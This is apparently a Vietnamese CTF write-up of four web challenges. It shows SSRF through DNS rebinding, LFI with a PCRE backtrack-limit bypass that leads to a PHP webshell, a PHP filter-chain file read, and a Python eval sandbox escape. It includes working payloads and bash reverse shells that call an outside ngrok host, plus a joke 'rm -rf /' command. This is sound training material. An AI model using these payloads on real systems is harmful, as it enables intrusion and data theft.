---
title: "KCSC CSCV 2026"
date: 2026-08-16
updated: 2026-08-19
description: "Writeup for the KCSC CSCV 2026 web challenges, covering SSRF, upload, converter and Python sandbox bypass."
tags: [CTF]
category: writeup
lang: vi
---
## Previewer
### Overview
Đây là một challenge viết bằng Nodejs, trước hết e sẽ xem qua `docker-compose`
```dockerfile
services:
  server:
    build: .
    ports:
      - "3000:3000"
    environment:
      FLAG: "FLAG{fake}"               // flag nằm trong env
      PORT: "3000"
      ADMIN_PORT: "9001"               // port chứa admin
      VALIDATION_DELAY_MS: "2500"
    read_only: true
    tmpfs:
      - /tmp
    security_opt:
      - no-new-privileges:true
    healthcheck:
      test: ["CMD", "node", "-e", "fetch('http://127.0.0.1:3000/api/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))"]
      interval: 20s
      timeout: 5s
      retries: 5
```

Bên `Dockerfile` cũng cho ta biết thêm server sử dụng `node:22-alpine`
Chall có 2 file chính là `app.js` và `server.js`
lướt qua chall ta thấy 
![image](/research/kcsc-cscv-2026/H1jQ5EJvfl.png)
Có thể thấy server sẽ nhận rawurl sau đó sẽ đi lấy phần nội dung trang web đó về dạng này khá là giống `ssrf` , ta cần xem lại source code để confirm và xem cách lấy flag như nào
![image](/research/kcsc-cscv-2026/ryyVjNkvze.png)
hàm `isLoopbackRequest` sẽ kiểm tra xem request từ Address client có phải 1 trong 3 ip `127.0.0.1` , `::1` hay `::ffff:127.0.0.1` và hàm này được sử dụng để kiểm tra xem có phải local requets hay không tại `adminRouter` , và có thể thấy 3 loại ip này được hard core nên có vẻ ta không sử dụng những loại thay thế như `127.0.0.x` được
Ngoài ra nếu là local request, nếu path là `/admin/flag` thì ta sẽ nhận được `${FLAG}`
Như vậy hương đi của bài này sẽ là `SSRF local -> get Flag`
- Trace lên trên tại hàm `PreviewUrl`
![image](/research/kcsc-cscv-2026/ryAhpEJwMg.png)
Hàm này nhận tham số `rawUrl` được truyền từ
```javascript
const url = await getPreviewInput(req, requestUrl);
const result = await previewUrl(url);
```
-  - `url` được lấy từ param với `GET`, và `POST` qua json body
-  - ![image](/research/kcsc-cscv-2026/rk30RE1vMl.png)

Đầu tiên `url` sẽ đi qua `parsePreviewUrl` hàm này có hiệm vụ kiểm soát protocol via input user ( http / https )
- - ![image](/research/kcsc-cscv-2026/HJ9PkSJDMx.png)

Sau đó hostname sẽ đi qua một hàm Validate là `lookupPublicARecords`
- ![image](/research/kcsc-cscv-2026/Sy9EeHyvMx.png)
Hàm này có nhiệm vụ đầu tiên là sẽ phân giải DNS của host được truyền vào tức là những domain mà trỏ về `127.0.0.1` thì đều bị blacklist qua hàm `isBlockIPv4` và block request nên những cách `Domain Redirect` và `Encoded IP Address` ta có thể loại trừ
### Về hàm isBlockedIPv4
![image](/research/kcsc-cscv-2026/SyRJGr1vMx.png)
ip qua hàm `parseIpv4` sẽ được phân tách bới dấu `.` và qua hàm `isBlockIPv4` lấy 2 giá trị đầu tiên và gán giá trị `a,b`
ta có thể thấy bộ blacklist rất nhiều từ đầu `127` , `169.254`,`192.0`,`192.168` hay kể cả `0.` (0.0.0.0) thì đều bị block, những có vẻ nó chỉ lấy 2 phần đầu sau khi chia , nếu ta có thể nhét ra đằng sau thì sẽ bypass thành công

Lúc này thì em có thử lên [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) để thử một số payload
TRước hết em đã thử với Ipv6 và cả mix với ipv4
```
http://[::]:80/
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]
```
Nhưng tất cả đều trả lỗi `ENOTFOUND` đó là error not found, em tìm hiểu thì nó là do việc DNS chỉ resolve domain và có vẻ nó gặp vấn đề với dấu `[]` nên đã bê cả phần `[]` dẫn tới việc ko resolve được
Tất nhiên vì có phân giải dns nên cách này cũng sẽ fail
![image](/research/kcsc-cscv-2026/ByXsKHJPze.png)
e cũng thử cả các cách encoding khác nhưng cũng đều bị denied
![image](/research/kcsc-cscv-2026/BysRFBkwGx.png)

### DNS rebinding
Ở phần cuối có kĩ thuật DNS rebinding đây là một kĩ thuật khá hay khi giữa 2 lần resolve nó có thể cho ra 2 ip khác nhau ví dụ
- lần 1
```
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4 
-> ip1: 1.2.3.4
```
- lần 2
```
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
-> ip2: 169.254.169.254
```
Và nó có vẻ khá hợp với bài này khi bài có resolve domain khiến việc bypass trở nên khó khăn, ta cần xem liệu server có resolve lại lần 2 hay ko
![image](/research/kcsc-cscv-2026/BJoTArJvzl.png)
Ta có thể thấy được khi qua được lớp filter , server sẽ thực thiện `fetch` đến domain đó , và đây chính là  điểm thích hợp để rebinding với flow như sau
```
lookupPublicARecords check
            |
resolve valid ip (e.g 8.8.8.8)
            |
          fetch
            |
    ip resolve to 127.0.0.1
            |
      SSRF to localhost
```
### Exploit
Ta sẽ thực hiện rebinding với domain `make-8.8.8.8-rebind-127.0.0.1-rr.1u.ms`
Và chain payload để lấy flag tại `admin/flag` và port 9001
```
http://make-8.8.8.8-rebind-127.0.0.1-rr.1u.ms:9001/admin/flag
```
Do xác suất rebinding nên e phải send khá nhiều mới get được flag

```
FLAG{previewer_solved_6O49N0jUguI4}
```

## Innocent Upload
### Overview
Bài này e có hướng nhưng bị stuck quá nên e đã skip :(
![image](/research/kcsc-cscv-2026/BJU3XUyDGl.png)
Lướt qua source ta thấy server chạy apache, web root `/var/www/html` và flag chỉ được read qua `/readflag.c` -> ta cần RCE 
Tại `index.php` ta có feature upload file và việc check file 
![image](/research/kcsc-cscv-2026/H1HUEUyPMx.png)
filter khá yếu vì nó hard core -> bypass bằng `PhP`,`PHP`,... hoặc cũng có thể sử dụng `image`
e có đặt sửa src chút để dễ debug
![image](/research/kcsc-cscv-2026/ByyRNLJvGe.png)
Và khi upload xong ta thấy file path
![image](/research/kcsc-cscv-2026/ByhWBL1Dfg.png)
trong đó `$fileName = exploit.jpg` , `$file_path = /tmp/uploads/3e5a1cba5726637f7fdc80c3e1c36ed0875e67baaaa437d9f58f79422bccc7f0`
Trong đó ta có `oblivion` được random để nhét vào file_path , có thể để tránh việc RCE qua LFI
Sang `view.php` ta có thể thấy rất rõ lỗ hổng `LFI` với `include()`
![image](/research/kcsc-cscv-2026/HyeCBUkvfx.png)
Nhưng trước đó có hàm `normalizePath` để làm sạch , e có thêm `echo normalizePath("/tmp/uploads/" . $path);`
 để debug rõ hàm này sẽ cắt tỉa phần nào

e thử POST với tham số `path=../../etc/passwd` để test
![image](/research/kcsc-cscv-2026/B1q_ILkPfe.png)
LFI work
### Ý tưởng ban đầu
Ban đầu e ý tưởng là đặt tên file là `../file.jgp` để có thể upload thẳng vào folder `uploads` cũng như để phục vụ cho việc bypass length trong `preg_match` 
![image](/research/kcsc-cscv-2026/SkOUwL1Dfl.png)
Nhưng khi debug thì e thấy fail
 Sau đó đoạn này e bị stuck khá lâu vì ko biết kiếm `oblivion` ở đâu 
Với LFI, e đã thử đọc `/proc/self/environ` và một số file nhưng ko kiếm được session , e bắt đầu đi research để xem `session thường sẽ nằm ở đâu`
![image](/research/kcsc-cscv-2026/Hks0FLJwfl.png)
có khá nhiều path , nhưng tất cả đều dính keyword `php` bị ban tại `!preg_match("/^.*([0-9a-f]{64}|ht|php).*/mi", $path)` khiến việc tìm kiếm trở nên khá khó khăn
Lúc này có thử vào docker để tìm xem nó có thể nằm ở đâu , vì nó nằm sau `/tmp/uploads` , nên e đã vào `/tmp` để xem thử và e khá bất ngờ khi e tưởng chỉ có dir `uploads` mà còn có cả dir session nữa , e thử vào dir này , thử cat thì e đã có được `oblivion`
```
$ cat sess_fc638cfead9bff1fda773b0d54d8afbc
oblivion|s:64:"3e5a1cba5726637f7fdc80c3e1c36ed0875e67baaaa437d9f58f79422bccc7f0";
```
Và `fc638cfead9bff1fda773b0d54d8afbc` trong khá quen, e kiểm tra một hồi thì biết nó chính là cái `PHPSESSID`
```
Cookie: PHPSESSID=fc638cfead9bff1fda773b0d54d8afbc
```
### Sai lầm
E đã mắc sai lầm khi đọc source code qua loa, dẫn đến việc dù có searching nhưng lại chả có thông tin gì hữu ích, khiến em rơi vào bế tắc. Cụ thể là hàm `preg_match`
```php
!preg_match("/^.*([0-9a-f]{64}|ht|php).*/mi", $path)
```
E đã đọc qua loa và đoán rằng hàm này chỉ giới gian input đầu vào là 64 char nên em đã research đến cả buffer memory của hàm này và e đã thử những cách như
- `10000001` chữ a -> vẫn trả true
- newline -> true

Mãi về sau e đọc dc bài viết này về reDOs
![image](/research/kcsc-cscv-2026/rJedd9lDfe.png)
nôm na là biến `pcre.backtrack_limit` sẽ thực hiện việc gom hết chuỗi, sau đó backtracking để ktra với subject một cách đệ quy
![image](/research/kcsc-cscv-2026/Sk4GKqxPfl.png)
Sau khi chạy đoạn này e mới hiểu `preg_match("/^.*([0-9a-f]{64}|ht|php).*/mi", $path` tức là nó mất kể chuỗi có [0-9a-f] mà xuất hiện liên tiếp 64 lần thì sẽ trả true -> tức là ko hề limit length
Lỗ hổng xảy ra đó là thành phần `pcre.backtrack_limit` sẽ chỉ backtracking 10^6 lần để kiểm tra , nếu vượt quá số lần đó nó sẽ trả lỗi và trả false
![image](/research/kcsc-cscv-2026/rJ8iqcgwfx.png)
### Ý tưởng bypass
- Vì `olivion` được random(64) -> match với regex , do đó ta bắt buộc phải để cái này ờ đầu
- vì việc dùng 10^6 chữ `z` sẽ ko giải quyết được gì, vì ta cũng sẽ ko include dc đúng file nên cách trực quan nhất sẽ là sử dụng pathtraversal
- Thực hiện phép toán đơn giản `../` có 3 char -> sử dụng `zz/` để vừa tiến vừa lùi vậy với 10^6 char ta sẽ sử dụng `166667` char `../` và `zz/`

FINAL PAYLOAD
```
path=7a9c6a6dfd593232c065b1951b2f6b95dc1d0147fedb9573e88077edfb69ee8e/zz/zz/zz/zz/zz/zz.
......(more /zz/)..../../../../../../../../.....(more ../)..../exploit.png
```
Craft shell để test
```php
<?php system("id"); ?>
```
![image](/research/kcsc-cscv-2026/r1tpT9lwfl.png)

Reverse shell để lấy flag cho thoải mái
mở port 4444 để listener `nc -lnvp 4444`
```php
<?php system("bash -c 'bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/16124 0>&1'"); ?>
```
Upload file lên và lấy flag
![image](/research/kcsc-cscv-2026/Hk_HR5evzx.png)

```
FLAG{Fake-flag}
```

## Sercure converter
### Overview
![image](/research/kcsc-cscv-2026/Bk7jm1Mvzx.png)
sơ qua `docker-compose` ta thấy server cấu hình `read_only` nên ta không thể ghi hay chèn file nếu RCE được
![image](/research/kcsc-cscv-2026/SJsxNyzwfg.png)
Bên dockerfile flag sẽ nằm trong `/flag` ngoài ra server còn tạo thêm 1 sample bmp được base64
![image](/research/kcsc-cscv-2026/HyE94yMvMx.png)
Tại php.ini ta chỉ cần để ý 2 thông số là `allow_url_fopen=1 | file_uploads=1` -> có thể bài này sẽ liên quan đến `RFI`
Logic chính của cả challenge đó là file `lib.php`
![image](/research/kcsc-cscv-2026/Sk4MSJfwGl.png)
Ta để ý đoạn parse url này, nhận param `file` để xử lí và chỉ nhận 2 protocol là `php://` và `file://` do đó `RFI` ta có thể bỏ qua. khả năng rất cao tham số `file` này sẽ dính bug , ta cần xem bộ santi của tham số này
![image](/research/kcsc-cscv-2026/Bkb3BJfDzl.png)
Hàm nhận tham số xử lí khá đơn giản khi chỉ dùng `trimp` để loại bỏ khoảng trống cũng như các kí tự đặc biệt chứ ko hề có filter hay gì , tuy nhiên việc validate lại diễn ra ở cuối file
![image](/research/kcsc-cscv-2026/rJPm81GDMe.png)
e đã thêm `echo $mine` để debug cho dễ, ta sẽ thử với file mẫu của bài `samples/preview.bmp`
![image](/research/kcsc-cscv-2026/HJz0I1zvMx.png)
Hàm `exif_imagetype` được sử dụng để kiểm tra với đường dẫn file, và trả về mime file dạng `image/bmp`
![image](/research/kcsc-cscv-2026/SkH07xzDMl.png)
Nhưng hàm này chỉ kiểm tra byte đầu, đó là những magic byte, nên ta có thể bypass bằng cách chèn thêm `BMP` ở đầu file 
![image](/research/kcsc-cscv-2026/Bkb_EgGvfe.png)
Thế nhưng sau khi convert thì lại ko handle PHP được, ta cần xem bên `convert.php` hay `view.php` xử lí file như nào
![image](/research/kcsc-cscv-2026/H1JlSxfvMx.png)
Cả 2 file đều sử dụng hàm `readfile()` đây là một sink giúp ta read file tùy ý có thể gây ra path traversal. Và đây cũng chính là bug chính của bài.
### Bypass waf
Nhưng vấn đề chính là lớp santi chính của bài chỉ có thể đến dc readfile nếu là một valid BMP
Để ý lại lớp filter cơ nãy khi server hạn url bên ngoài nhưng lại cho sử dụng protocal cụ thể là `php` và `file` nhưng vấn đề xảy ra là hàm sao để chèn BMP vào những byte đầu tiên để qua đc lớp santi, vì ta ko thể write file vì cấu hình `read-only`, chỉ có thể đọc nhưng trên server ngoài file sample ra thì ko còn file nào có định dạng như thế
Những dạng bài upload file mà ko được save + cho phép sử dụng wrapper thì e nghĩ để đọc flag của bài ta ko cần RCE mà chỉ read qua stream wrapper. Và có một kỹ thuật đặc biệt chuyên để bypass filter đó là `PHP filter Chain` , ta cần Chain để tạo ra keyword `BMP` từ `resouce=/flag`

### PAYLOAD
```
python3 php_filter_chain_generator.py --chain 'BMP'             
[+] The following gadget chain will generate the following code : BMP (base64 value: Qk1Q)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
Thay `php://temp` = `/flag` để lấy flag
![image](/research/kcsc-cscv-2026/r1byCgMPMg.png)

```
FLAG{FAKE}
```

## For user2
### overview
![image](/research/kcsc-cscv-2026/BJ5jhxXPGg.png)
Có thể thấy chall chạy python 3.12, flag nằm tại `/flag.txt` và server flask 3.1.1
Chall khá ngắn gọn ta cùng xem logic chính tại `app.py`
![image](/research/kcsc-cscv-2026/H1pSyWmvze.png)

Có thể thấy ngay được sink là hàm `eval()` , hàm này nhận direct user-input mà ko hề có validate hay saniti thông qua tham số `expr` trên url
- Nỗ lực quả author là disable `__builtins__` với những object có hẵn hay cả việc `__import__`, ta cùng xem hàm `eval()` sẽ hoạt động như nào
### Eval() in python usage
![image](/research/kcsc-cscv-2026/S1aKxWQvGl.png)
- Ngoài thực hiện các chức năng tính toán cơ bàn, nếu có OS module thì nó có thể thực thi system command như `os.system('rm -rf /')` - j4f:))
- Ngoài os module ra còn có `subprocess module` -> `eval("subprocess.getoutput('pwd')")`
- Trường hợp OS hay các module exec system command bị disable , thì ta có thể sử dụng đến global fuction `__import__()` Hàm này cho phép ta Import các module vừa kể trên và system command `eval('__import__("subprocess").getoutput("ls")')`
- Nhưng Vấn đề là `__import__()` vẫn là một phần của `builtins`

Quay lại với bài toán `{"__builtins__": {}}` tức là cả global fumction cũng bị disable, ta cần tìm cách để bypass
### Bypass eval() without builtins
E có tham khảo bài viết này về cách bypass [dynamically-evaluating-code-using-python](https://medium.com/@laurentkubaski/dynamically-evaluating-code-using-python-9821a24f98ce)
Đó là việc sử dụng `__subclasses__()` bằng cách `[].__class__.__base__.__subclasses__()` để access đến all subclasses of object. Và 2 class quan trọng ta cần đó là `BuiltInImporter or Popen`
Vì ta cần tìm chính xác index của 2 class trong `__subclasses__()` nên ta có thể cần 1 vòng lặp để tìm kiếm từ đó load os module và thực thi shell
```python
[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system('echo hello the world')
```
Vì chall thuộc dạng blind RCE nên để kiểm chứng RCE ta sẽ dùng time-base, ngoài ra còn cách OOB nữa nhưng e kiểm tra trong docker thì đều thấy `curl` or `wget` đều bị disable
![image](/research/kcsc-cscv-2026/Sy8yKWmPze.png)
confirm RCE
- Tiếp theo em sẽ setup listener với port 4444
```
$ nc -lnvp 4444
```
shell
```python
bash -c 'bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/19401 0>&1'
```
![image](/research/kcsc-cscv-2026/B19FFZmwGx.png)

```
flag{dev}
```
